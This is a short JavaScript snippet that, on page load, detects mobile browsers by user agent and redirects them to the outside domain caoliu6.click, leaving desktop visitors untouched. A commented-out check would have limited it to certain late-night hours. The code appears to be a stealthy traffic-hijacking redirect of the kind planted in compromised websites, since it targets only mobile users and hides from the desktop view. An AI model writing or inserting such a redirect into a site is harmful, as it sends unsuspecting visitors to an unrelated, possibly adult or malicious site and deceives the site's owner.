window.onload=function(){
	let hours = new Date().getHours();//拿到当前小时
	//if(String(hours) === '22' || String(hours) === '0'){
		if (isMobile()) {
			window.location.href="http://caoliu6.click";
			} else {
				
			}
			//return true
		
		//}else{
			
			//return false
		//}
}
	function isMobile() {
		let flag = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
		return flag;
				}
